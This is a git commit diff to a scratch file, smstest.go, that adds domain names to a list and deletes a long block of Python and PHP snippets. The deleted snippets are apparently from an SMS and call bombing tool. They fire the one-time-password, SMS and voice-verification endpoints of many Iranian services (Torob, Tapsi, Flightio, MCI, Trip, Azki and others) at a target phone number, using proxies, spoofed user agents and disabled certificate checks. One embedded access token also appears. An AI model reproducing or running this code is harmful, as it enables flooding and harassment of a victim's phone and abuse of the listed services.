a0b6fd1dec3c32f44063de0cbd68e23f10faa537
monsmain <matinfarmani20@gmail.com>
2025-04-30 15:07:23 +0330

    Update smstest.go

--- smstest.go
+++ smstest.go
@@ -99,6 +99,9 @@ https://core.gap.im
 "https://api.sibche.com
 "https://flightio.com/
 "https://www.namava.ir/
+namava.ir
+ebcom.mci.ir
+flightio.com
 gamefa.com
 nikanbike.com
 ickala.com
@@ -145,126 +148,8 @@ asangem.com
 ---------------------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------------------
-new url:
-zabane python:https://github.com/secabuser
-
-    'tapsi': lambda num: post(
-        url="https://tap33.me/api/v2/user",
-        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-
-
-    'torob': lambda num: get(
-        url=f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-
-
-   'flightio_app': lambda num: post(
-        url="https://app.flightio.com/bff/Authentication/CheckUserKey",
-        json={
-            "userKey": num,
-            "userKeyType": 1
-        },
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-
-
-   'flightio': lambda num: post(
-        url="https://flightio.com/bff/Authentication/CheckUserKey",
-        json={"userKey": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-
-//////////////////////////////////////////////////////////////////////////////
-sms python :https://github.com/jafarm83
-
-@handler.sms_api
-def torob(num, proxies):
-    get(proxies=proxies, url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{num}',
-                headers={"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"},)
-
-
-https://github.com/jafarm8@handler.sms_api
-def drnext(num, proxies):
-            post(proxies=proxies, url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", 
-                json={
-                    "source": "besina",
-                    "mobile": f'0{num}'
-                }, )
-
-def mcishop(num, proxies):
-    n4 = {"msisdn":num}
-    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '1006ee1c-790c-45fa-a86d-ac36846b8e87','content-length': '23','content-type': 'application/json','origin': 'https://shop.mci.ir','referer': 'https://shop.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
-    post(proxies=proxies, url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
-
-def snapmarket(num, proxies):
-    post(proxies=proxies, url="https://account.api.balad.ir/api/web/auth/login/",
-                json={
-                    "phone_number": f'0{num}',
-                    "os_type": "W"
-                },
-
-
-python:
-  return $this->s002("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", ["UserName" => '+98' . $this->$Number]);
-
-
-
-
-
 ---------------------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------------------
-call python:https://github.com/jafarm83
-
-@handler.call_api
-def mrbilitcall(num, proxies):
-    get(proxies=proxies, url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{num}',
-    )    
-
-@handler.call_api
-def gap(num, proxies):
-    get(proxies=proxies, url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{num}&type=IVR')
-
-@handler.call_api
-def novinbook(num, proxies):
-    post(proxies=proxies, url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{num}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'})
-
-@handler.call_api
-def azki(num, proxies):
-    get(proxies=proxies, url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{num}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})
-
-@handler.call_api
-def trip(num, proxies):
-    rhead = {"content-type": "application/json;charset=UTF-8","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","accept": "application/json, text/plain, */*","accept-language": "fa-IR","user-agent": generate_user_agent(os="android"),"sec-ch-ua-platform": "\"Android\"","origin": "https://www.trip.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.trip.ir/","accept-encoding": "gzip, deflate, br","host": "gateway.trip.ir"}
-    #Call&sms
-
-    post(proxies=proxies, url="https://gateway.trip.ir/api/registers", headers=rhead, json={"CellPhone":"0"+num})
-    post(proxies=proxies, url="https://gateway.trip.ir/api/Totp", headers=rhead, json={"PhoneNumber": "0"+num})
-
-@handler.call_api
-def paklean(num, proxies):
-    n4 = {"username": "0"+num}
-    rhead = {"user-agent": generate_user_agent()}
-    post(proxies=proxies, url="https://client.api.paklean.com/user/resendVoiceCode", json=n4, headers=rhead)
-
-@handler.call_api
-def ragham(num, proxies):
-    n4 = {"phone": "+98"+num}
-    rhead = {"user-agent": generate_user_agent()}
-    post(proxies=proxies, url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)
-
-
-
 
 
 
